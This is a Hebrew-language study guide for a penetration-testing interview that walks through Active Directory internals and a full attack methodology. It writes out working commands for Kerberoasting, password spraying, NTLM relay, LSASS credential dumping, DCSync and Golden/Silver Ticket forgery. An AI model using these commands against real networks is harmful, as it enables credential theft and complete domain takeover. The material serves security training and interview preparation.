מה זה Active Directory?

🏢 הגדרה בסיסית

Active Directory (AD) היא מערכת של Microsoft לניהול מרכזי של משאבי רשת בארגון. היא פועלת כ-"ספר טלפונים" של הרשת - מאחסנת מידע על כל המשתמשים, המחשבים, הקבוצות והמשאבים בארגון.

למה זה קריטי ל-Pentesting?

  • ~95% מארגוני Fortune 500 משתמשים ב-AD
  • שליטה ב-AD = שליטה מלאה בארגון
  • מבנה מורכב שיוצר הרבה attack surface
  • backwards compatibility יוצר חולשות
🌲 Forest

הרמה הגבוהה ביותר של AD. מכיל Domain אחד או יותר. יש Trust relationships בין הדומיינים ב-Forest.

🏰 Domain

יחידת ניהול בסיסית. לכל Domain יש שם (כמו corp.local), מדיניות אבטחה, ו-Domain Controller משלו.

🖥️ Domain Controller (DC)

השרת שמריץ את AD. מאחסן את ה-NTDS.dit (מסד הנתונים של כל המשתמשים והסיסמאות). זה היעד הסופי של תוקף!

📁 Organizational Unit (OU)

תיקייה לוגית ב-AD לארגון אובייקטים. אפשר להחיל עליה Group Policy. לדוגמה: OU של "מחלקת כספים".

👥 Groups

קבוצות משתמשים עם הרשאות משותפות. Domain Admins - הקבוצה הכי חזקה, שליטה מלאה בדומיין.

📜 Group Policy (GPO)

מדיניות שמוחלת על משתמשים/מחשבים. מגדירה הגדרות אבטחה, סקריפטים, הרשאות ועוד. יכולה להכיל סיסמאות!

💾 NTDS.dit - מסד הנתונים של AD

קובץ NTDS.dit הוא הלב של Active Directory. הוא מאוחסן ב-Domain Controller ומכיל:

  • כל חשבונות המשתמשים וה-NTLM hash של הסיסמאות שלהם
  • כל חשבונות המחשבים ופרטי התחברות
  • מידע על קבוצות וחברויות
  • Trust relationships בין דומיינים
  • Kerberos keys - כולל ה-KRBTGT hash (המפתח למלכות!)
⚠️
מיקום הקובץ: C:\Windows\NTDS\ntds.dit - הקובץ נעול תמיד על ידי המערכת, לכן צריך שיטות מיוחדות לחלץ אותו (VSS, ntdsutil, secretsdump)

פרוטוקולים ושירותים

🔑 Kerberos - פרוטוקול האימות המרכזי

Kerberos הוא פרוטוקול האימות העיקרי ב-AD. הוא פועל על בסיס "כרטיסים" (tickets) ומשתמש ב-Key Distribution Center (KDC) שרץ על ה-DC.

תהליך האימות (חשוב מאוד להבין!):

User KDC (DC) Service │ │ │ │ 1. AS-REQ │ │ │ (username + timestamp │ │ │ encrypted with │ │ │ user's hash) │ │ │───────────────────────►│ │ │ │ │ │ 2. AS-REP │ │ │ (TGT encrypted with │ │ │ KRBTGT hash) │ │ │◄───────────────────────│ │ │ │ │ │ 3. TGS-REQ │ │ │ (TGT + SPN of │ │ │ target service) │ │ │───────────────────────►│ │ │ │ │ │ 4. TGS-REP │ │ │ (Service Ticket │ │ │ encrypted with │ │ │ service's hash) │ │ │◄───────────────────────│ │ │ │ │ │ 5. AP-REQ (Service Ticket) │ │───────────────────────────────────────────────────►│ │ │ │ │ 6. AP-REP (optional, mutual auth) │ │◄───────────────────────────────────────────────────│
💡
מושגי מפתח:
• TGT (Ticket Granting Ticket) - הכרטיס הראשוני, מוצפן עם hash של KRBTGT
• TGS (Ticket Granting Service) - כרטיס לשירות ספציפי
• SPN (Service Principal Name) - שם ייחודי של שירות ברשת
• KRBTGT - חשבון מיוחד שה-hash שלו מצפין את כל ה-TGTs

למה זה חשוב לתוקף?

  • Kerberoasting - ה-TGS מוצפן עם ה-hash של השירות → אפשר לפצח אותו offline!
  • AS-REP Roasting - אם Pre-Auth מבוטל, אפשר לבקש TGT בלי סיסמה ולפצח
  • Golden Ticket - עם hash של KRBTGT אפשר לזייף כל TGT
  • Silver Ticket - עם hash של שירות אפשר לזייף TGS
  • Pass-the-Ticket - אפשר לגנוב כרטיס ולהשתמש בו ממחשב אחר

🔐 NTLM Authentication

פרוטוקול אימות ישן יותר, עדיין נמצא בשימוש. פועל על Challenge-Response:

  1. Client שולח username
  2. Server שולח challenge (מספר אקראי)
  3. Client מצפין את ה-challenge עם ה-NTLM hash ושולח response

חולשות: Pass-the-Hash, NTLM Relay, פיצוח offline

TCP 445 TCP 139

📡 LDAP (Lightweight Directory Access Protocol)

הפרוטוקול לשאילתות מול AD. כמו SQL למסד נתונים, LDAP הוא השפה לשאול את AD שאלות.

שימושים: Enumeration של משתמשים, קבוצות, מחשבים, GPOs

TCP 389 TCP 636 (LDAPS) TCP 3268 (GC)

📂 SMB (Server Message Block)

פרוטוקול לשיתוף קבצים ומשאבים ברשת Windows. משמש גם ל-remote execution.

חולשות: Null sessions, relay attacks, שיתופים פתוחים, psexec

TCP 445 TCP 139

🖥️ RPC / WMI / WinRM

פרוטוקולים להרצת פקודות מרחוק על מכונות Windows.

שימושים: Lateral movement, remote execution, enumeration

TCP 135 (RPC) TCP 5985 (WinRM) TCP 5986 (WinRM SSL)

Enumeration - שלב האיסוף

🎯
כלל הזהב של Pentesting: "Enumeration is 80% of the work." ככל שתאספי יותר מידע, כך ההתקפה תהיה ממוקדת ויעילה יותר.

🌐 Network Enumeration

▼

השלב הראשון - להבין את הרשת, למצוא את ה-DC ולזהות שירותים.

nmap - Network Scanning
# Quick scan to find live hosts nmap -sn 10.10.10.0/24 # Find Domain Controller (look for ports 88, 389, 636) nmap -p 53,88,135,139,389,445,464,636,3268,3389,5985 10.10.10.0/24 # Full port scan on DC nmap -sV -sC -p- 10.10.10.10 # Scan for vulnerabilities nmap --script vuln 10.10.10.10
DNS Enumeration
# Find DC via DNS SRV records nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local # Zone transfer (if allowed - jackpot!) dig axfr corp.local @10.10.10.10 # Reverse lookup nmap -sL 10.10.10.0/24

🗂️ AD Enumeration (with credentials)

▼

ברגע שיש לך credentials (אפילו של משתמש רגיל), אפשר לאסוף המון מידע.

BloodHound / SharpHound - AD Mapping
# BloodHound - THE tool for AD enumeration # Collects all AD relationships and finds attack paths # SharpHound (C# collector - run from Windows) .\SharpHound.exe -c All # BloodHound Python (from Linux) bloodhound-python -u user -p 'password' -d corp.local -dc dc.corp.local -c All # Then import the JSON files into BloodHound GUI # Look for: Shortest Path to Domain Admin!
ldapsearch - LDAP Enumeration
# Enumerate all users ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName # Find Domain Admins ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(&(objectClass=group)(cn=Domain Admins))" member # Find computers ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(objectClass=computer)" cn # Find users with SPN (Kerberoastable!) ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
enum4linux / CrackMapExec - SMB Enum
# enum4linux - classic SMB/AD enumeration enum4linux -a 10.10.10.10 # CrackMapExec (netexec) - Swiss army knife netexec smb 10.10.10.0/24 # Find SMB hosts netexec smb 10.10.10.10 -u user -p pass --shares # List shares netexec smb 10.10.10.10 -u user -p pass --users # List users netexec smb 10.10.10.10 -u user -p pass --groups # List groups netexec smb 10.10.10.10 -u user -p pass --pass-pol # Password policy
PowerView - PowerShell AD Enum
# Import PowerView Import-Module .\PowerView.ps1 # Get Domain Info Get-Domain Get-DomainController # Enumerate Users Get-DomainUser | select samaccountname, description, memberof Get-DomainUser -SPN # Kerberoastable users! Get-DomainUser -PreauthNotRequired # AS-REP Roastable! # Enumerate Groups Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember # Find interesting ACLs Find-InterestingDomainAcl # Find shares Find-DomainShare -CheckShareAccess # Find GPP passwords Get-GPPPassword

🔑 Password Attacks

▼

Password Spraying

ניסיון סיסמה אחת נגד הרבה משתמשים (נמנע מ-lockout).

netexec / kerbrute
# Check password policy first! netexec smb DC -u user -p pass --pass-pol # Password spray via SMB netexec smb DC -u users.txt -p 'Winter2024!' --continue-on-success # Password spray via Kerberos (stealthier) kerbrute passwordspray -d corp.local users.txt 'Winter2024!'
⚠️
תמיד לבדוק password policy לפני spray! Lockout = גילוי + השבתת חשבונות.

AS-REP Roasting

אם Pre-Authentication מבוטל → אפשר לבקש TGT ולפצח offline!

impacket / Rubeus
# From Linux - no creds needed! impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat # From Windows .\Rubeus.exe asreproast # Crack with hashcat hashcat -m 18200 hash.txt rockyou.txt

🔥 Kerberoasting

התקפה קלאסית וחשובה מאוד! כל שירות עם SPN → אפשר לבקש TGS ולפצח את ה-hash של השירות offline.

Kerberoasting - impacket / Rubeus
# From Linux (need valid creds) impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.10.10 -request # From Windows .\Rubeus.exe kerberoast # Crack with hashcat hashcat -m 13100 hash.txt rockyou.txt # Crack with john john hash.txt --wordlist=rockyou.txt
💡
למה זה עובד? כל משתמש authenticated ב-AD יכול לבקש TGS לכל שירות. ה-TGS מוצפן עם ה-hash של חשבון השירות → פיצוח offline בלי לנגוע בשירות.

🔄 Relay Attacks

▼

התקפות relay מנצלות את עובדת ש-NTLM authentication ניתן להעביר (relay) ליעד אחר.

NTLM Relay Attack
# Step 1: Find targets without SMB Signing netexec smb 10.10.10.0/24 --gen-relay-list targets.txt # Step 2: Start responder (capture/relay NTLM) responder -I eth0 -rdwv # Step 3: Relay captured auth to target impacket-ntlmrelayx -tf targets.txt -smb2support # Can also relay to LDAP for ACL abuse: impacket-ntlmrelayx -t ldap://DC --escalate-user attacker
💡
Responder מרעיל LLMNR/NBT-NS/mDNS requests ברשת, גורם למכונות לשלוח NTLM authentication לתוקף. אפשר לפצח את ה-hash (NTLMv2) או ל-relay אותו.

שיטות לגרום למכונות לבצע authentication:

  • Responder - LLMNR/NBT-NS poisoning
  • PetitPotam - מנצל EFS RPC לגרום ל-DC לבצע auth
  • PrinterBug (SpoolSample) - מנצל Printer Spooler service
  • mitm6 - מנצל IPv6 configuration

🛡️ ACL / Permission Abuse

▼

Active Directory משתמש ב-ACLs (Access Control Lists) כדי להגדיר מי יכול לעשות מה. Misconfigured ACLs = escalation path!

Permission What it allows Attack
GenericAll Full control over object Reset password, add to group, set SPN
GenericWrite Write to any attribute Set SPN (Kerberoast), modify script path
WriteOwner Change object owner Take ownership → give yourself GenericAll
WriteDACL Modify ACL Give yourself any permission
ForceChangePassword Reset user's password Change target's password without knowing current
AddMember Add to group Add yourself to Domain Admins
AllExtendedRights Special permissions DCSync (Replicating Directory Changes)
ACL Abuse Examples
# Find interesting ACLs with BloodHound # Cypher: MATCH p=shortestPath((n:User)-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) # Force password change (if ForceChangePassword) net rpc password "targetuser" "newpass123!" -U "corp.local/attacker%password" -S dc.corp.local # Add to group (if AddMember on group) net rpc group addmem "Domain Admins" "attacker" -U "corp.local/attacker%password" -S dc.corp.local # Set SPN for Kerberoasting (if GenericWrite) # Then Kerberoast the target user python3 targetedKerberoast.py -d corp.local -u attacker -p password

🔗 Delegation Attacks

▼

Delegation מאפשר לשירות לפעול בשם משתמש אחר. סוגי delegation:

Unconstrained

השירות יכול להתחזות לכל משתמש מול כל שירות. הכי מסוכן! ה-TGT של המשתמש נשמר על המכונה.

Constrained

השירות יכול להתחזות רק מול שירותים ספציפיים. עדיין ניתן לניצול עם S4U2Self/S4U2Proxy.

Resource-Based (RBCD)

היעד מגדיר מי יכול להתחזות אליו. ניתן לניצול אם יש שליטה על computer object.

RBCD Attack
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on target # Step 1: Create/find a computer account you control impacket-addcomputer corp.local/user:pass -computer-name EVIL$ -computer-pass Password123 # Step 2: Set RBCD on target impacket-rbcd corp.local/user:pass -delegate-to TARGET$ -delegate-from EVIL$ -action write # Step 3: Get service ticket as admin impacket-getST corp.local/EVIL$:Password123 -spn cifs/TARGET.corp.local -impersonate Administrator # Step 4: Use the ticket export KRB5CCNAME=Administrator.ccache impacket-psexec corp.local/Administrator@TARGET.corp.local -k -no-pass

Privilege Escalation

📊 שיטות להעלאת הרשאות

🖥️ Local Privilege Escalation (על המכונה)

  • Unquoted Service Paths - נתיבי שירות ללא מרכאות
  • Service misconfigurations - שירותים עם הרשאות שגויות
  • AlwaysInstallElevated - התקנת MSI כ-SYSTEM
  • Stored credentials - סיסמאות שמורות (Windows Vault, registry)
  • Token impersonation - PrintSpoofer, Potato attacks (SeImpersonatePrivilege)
  • DLL Hijacking - החלפת DLL בנתיב שנטען על ידי שירות
Common PrivEsc Checks
# Check current privileges whoami /priv whoami /groups # Key privileges to look for: # SeImpersonatePrivilege → Potato attacks (PrintSpoofer, JuicyPotato) # SeBackupPrivilege → Read any file (including SAM, NTDS.dit) # SeRestorePrivilege → Write any file # SeDebugPrivilege → Inject into processes, dump LSASS # SeTakeOwnershipPrivilege → Take ownership of any object # Automated enumeration .\winPEAS.exe .\SharpUp.exe .\PowerUp.ps1 → Invoke-AllChecks

🏰 Domain Privilege Escalation

  • Kerberoasting / AS-REP Roasting - פיצוח credentials של service accounts
  • ACL Abuse - ניצול הרשאות שגויות על אובייקטים ב-AD
  • GPP Passwords - סיסמאות ב-Group Policy Preferences (cpassword)
  • LAPS - Local Administrator Password Solution - אם יש הרשאות קריאה
  • Delegation abuse - Unconstrained/Constrained/RBCD
  • DNSAdmins - טעינת DLL זדוני דרך DNS service
  • Certificate abuse (AD CS) - ESC1-ESC8 attacks

📜 AD CS (Active Directory Certificate Services) Attacks

אחד מ-attack vectors הכי חזקים וחדשים יחסית. שירותי Certificate ב-AD לעיתים קרובות misconfigured.

Certipy - AD CS Enumeration & Exploitation
# Enumerate vulnerable certificate templates certipy find -u user@corp.local -p password -dc-ip 10.10.10.10 -vulnerable # ESC1: Template allows client auth + enrollee supplies subject certipy req -u user@corp.local -p password -ca corp-CA -template VulnTemplate -upn administrator@corp.local # Authenticate with the certificate certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
🔥
ESC1 הוא הנפוץ ביותר: אם template מאפשר enrollment + Client Authentication + enrollee supplies subject name → אפשר לבקש certificate בשם Domain Admin!

Lateral Movement - תנועה רוחבית

🔀 שיטות תנועה רוחבית

אחרי שיש credentials/hash/ticket, איך זזים למכונות אחרות ברשת.

Pass-the-Hash (PtH)
# Use NTLM hash directly - no need for password! # CrackMapExec / NetExec netexec smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash # Impacket PsExec impacket-psexec corp.local/Administrator@10.10.10.20 -hashes :ntlm_hash # Impacket WMIExec impacket-wmiexec corp.local/Administrator@10.10.10.20 -hashes :ntlm_hash # Evil-WinRM evil-winrm -i 10.10.10.20 -u Administrator -H ntlm_hash
Pass-the-Ticket (PtT)
# Use Kerberos ticket instead of password/hash # Export tickets from memory (Windows) .\Rubeus.exe dump .\mimikatz.exe sekurlsa::tickets /export # Import and use ticket (Linux) export KRB5CCNAME=/path/to/ticket.ccache impacket-psexec corp.local/user@target.corp.local -k -no-pass
Credential Dumping
# Mimikatz - THE credential dumping tool mimikatz # sekurlsa::logonpasswords # Dump all creds from LSASS mimikatz # sekurlsa::tickets # Dump Kerberos tickets mimikatz # lsadump::sam # Dump local SAM database mimikatz # lsadump::dcsync /user:Administrator # DCSync! # LSASS dump (alternative methods) procdump.exe -ma lsass.exe lsass.dmp comsvcs.dll method (via rundll32) pypykatz lsa minidump lsass.dmp # Parse dump on Linux # Dump SAM/SYSTEM remotely impacket-secretsdump corp.local/admin:pass@10.10.10.20

  • KeePass databases
  • Scripts with hardcoded passwords
  • Shares with sensitive data
🏠

Domain Dominance & Persistence

👑 DCSync - The Holy Grail

מאפשר לדמות Domain Controller ולבקש replication של כל ה-hashes מה-DC.

DCSync Attack
# Need: Replicating Directory Changes + Replicating Directory Changes All # Members of Domain Admins / Enterprise Admins have this by default # From Linux impacket-secretsdump corp.local/admin:password@DC_IP # From Windows (Mimikatz) mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt mimikatz # lsadump::dcsync /domain:corp.local /all /csv # This gives you ALL hashes including: # - KRBTGT hash → Golden Ticket! # - All Domain Admin hashes # - All user hashes # - Machine account hashes

🎫 Golden Ticket

עם ה-KRBTGT hash אפשר לזייף TGT לכל משתמש, כולל Domain Admin שלא קיים.

Golden Ticket
# Mimikatz mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt # Impacket impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local fakeadmin
⚠️
Golden Ticket שורד גם אחרי שינוי סיסמאות! הדרך היחידה - לשנות את ה-KRBTGT hash פעמיים.

🥈 Silver Ticket

עם hash של service account אפשר לזייף TGS לשירות ספציפי. לא עובר דרך DC = יותר חמקני.

Silver Ticket
# Mimikatz - Silver Ticket for CIFS (file share) mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /ptt
🧰

כלים חיוניים

🔴 Impacket

Python collection לפרוטוקולי Windows. כולל: secretsdump, psexec, wmiexec, GetUserSPNs, GetNPUsers, ntlmrelayx ועוד.

🟡 BloodHound

מיפוי AD ויזואלי. מוצא attack paths מהמשתמש הנוכחי ל-Domain Admin. חובה לדעת!

🟣 Mimikatz

שליפת credentials מ-Windows. LSASS dump, DCSync, Golden/Silver Ticket, Pass-the-Hash.

🔵 Rubeus

כלי C# ל-Kerberos attacks. Kerberoasting, AS-REP Roasting, ticket manipulation.

🟢 CrackMapExec / NetExec

Swiss army knife לרשתות AD. Spray, enum, exec, shares. עובד עם password, hash, ticket.

🟠 Certipy

כלי ל-AD CS attacks. Enumeration וניצול של certificate template misconfigurations.

🔵 Evil-WinRM

Shell דרך WinRM (port 5985). תומך ב-hash, upload/download, PowerShell.

🔴 Responder

LLMNR/NBT-NS/mDNS poisoner. לוכד NTLM hashes ברשת.

🟡 Kerbrute

User enumeration ו-password spraying דרך Kerberos. יותר חמקני מ-SMB.

הכנה לראיון - מה צפוי?

🔮 ניתוח מבחן הבית שלך

מהמבחן בית שעברת (PCAP analysis, cracking auth, RE of Windows exe, web challenges), אפשר להסיק:

  • הם מצפים שתדעי לנתח תקשורת רשת (Wireshark, tcpdump)
  • הם מצפים שתדעי לפצח credentials (hashcat, john)
  • הם רוצים לראות חשיבה יצירתית ומתודולוגית

בראיון הטכני תשתיתי, ככל הנראה:

Very Likely
  • AD Enumeration (BloodHound, LDAP)
  • Kerberoasting / AS-REP Roasting
  • Password Spraying
  • SMB Share enumeration
  • Credential dumping (mimikatz/secretsdump)
  • Pass-the-Hash / Pass-the-Ticket
  • Privilege escalation path
Possible
  • NTLM Relay (Responder)
  • ACL Abuse
  • Delegation attacks
  • AD CS (Certificate) attacks
  • GPP Passwords
  • DCSync
  • Golden/Silver Ticket
  • Local privilege escalation

📋 Methodology Checklist - סדר פעולות למבחן

  • 1. Network Scan - nmap לזהות hosts, DC, ושירותים פתוחים
  • 2. Identify DC - חפשי ports 88, 389, 636, 3268
  • 3. Anonymous Enum - null sessions, anonymous LDAP, RPC
  • 4. User Enumeration - kerbrute, enum4linux, RPC
  • 5. Password Attacks - AS-REP Roasting (no creds needed!), then spray
  • 6. Got Creds! - SMB shares, Kerberoasting, BloodHound
  • 7. Check Access - netexec smb --shares, WinRM, RDP
  • 8. Credential Harvest - LSASS, SAM, cached creds, tickets
  • 9. Privilege Escalation - ACLs, delegation, GPP, AD CS
  • 10. Lateral Movement - PtH, PtT, WinRM, SMBExec
  • 11. Domain Admin! - DCSync, secretsdump, full control

💡 טיפים לראיון

✅
Do:
  • תחשבי בקול - תסבירי מה את עושה ולמה
  • תבדקי password policy לפני spray
  • תתעדי findings תוך כדי
  • תראי מתודולוגיה סדורה
  • אם נתקעת - תנסי גישה אחרת
  • תראי שאת מבינה את ה-"למה" ולא רק את ה-"איך"
❌
Don't:
  • לא להריץ כלים בלי להבין מה הם עושים
  • לא לעשות spray אגרסיבי בלי לבדוק policy
  • לא לדלג על enumeration
  • לא להיבהל אם משהו לא עובד
  • לא לשכוח לבדוק SMB shares!
  • לא להתמקד רק בכלים - הם רוצים לראות חשיבה
